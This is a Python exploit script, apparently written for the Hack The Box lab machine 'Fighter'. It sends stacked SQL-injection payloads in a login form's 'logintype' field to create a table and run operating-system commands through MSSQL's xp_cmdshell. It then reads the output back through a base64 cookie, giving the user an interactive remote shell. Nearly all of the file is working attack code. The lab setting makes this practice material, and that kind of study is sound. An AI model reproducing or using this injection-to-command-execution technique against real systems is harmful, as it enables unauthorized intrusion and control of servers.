#!/usr/bin/python3
# left off on time stamp 01:49:55
# This scrpt is to enumerate HTB fighter
from pwn import *
from base64 import b64decode
import requests, signal, pdb, time

def def_handler(sig, frame):
    print("\n\n[!] Exiting application....\n")
    dropTable()
    sys.exit(1)

    
signal.signal(signal.SIGINT, def_handler)
# exit the script with Ctrl + c

main_url = "http://members.streetfighterclub.htb/old/verify.asp"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def createTable():
    post_data = {
        'username': 'admin',
        'password': 'adin',
        'logintype': '2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }

    # Creating RCE table
    r = requests.post(main_url, data=post_data)


def truncateTable():
    post_data = {
        'username': 'admin',
        'password': 'adin',
        'logintype': '2;truncate table rce;-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
   

    # Truncating RCE table
    r = requests.post(main_url, data=post_data)

def executeCommand(command):
    post_data = {
        'username': 'admin',
        'password': 'adin',
        'logintype': '2;insert into rce(output) exec Xp_cMdShEll "%s";-- -' % command,
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
   

    # Executing the command
    r = requests.post(main_url, data=post_data)

    post_data = {
        'username': 'admin',
        'password': 'adin',
        'logintype': '2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
   

    # GET ID Top Counter, aka grab the id at the top of the column
    r = requests.post(main_url, data=post_data, allow_redirects=False)
    #pdb.set_trace()
    # Learning how to use pdb.set_trace() is a game changer for really learning python. 
    # Savitar does a walk through on pdb.set_trace() on HTB Fighter time stamp 01:43:00
    topIdCounter = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "=")).decode()
    #print(topIdCounter)
    
    
    for i in range(1, int(topIdCounter)):
    
    
        post_data = {
            'username': 'admin',
            'password': 'adin',
            'logintype': '2 union select 1,2,3,4,(select output from rce where id=%d),6-- -' % i,
            'rememberme': 'ON',
            'B1': 'LogIn'
        }
        
        r = requests.post(main_url, data=post_data, allow_redirects=False)
        #pdb.set_trace()
        output = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "="))
        #pdb.set_trace()
        if b"\xeb\xde\x94\xd8" not in output:
            print(output.decode())
    truncateTable()

def dropTable():
    post_data = {
        'username': 'admin',
        'password': 'adin',
        'logintype': '2;drop table rce;-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
   

    # Dropping RCE table
    r = requests.post(main_url, data=post_data)



if __name__ == "__main__":


    createTable()

    while True:
        command = input("> ")
        command = command.strip('\n')
        #pdb.set_trace()
        #print(command)
        executeCommand(command)

        print("\n")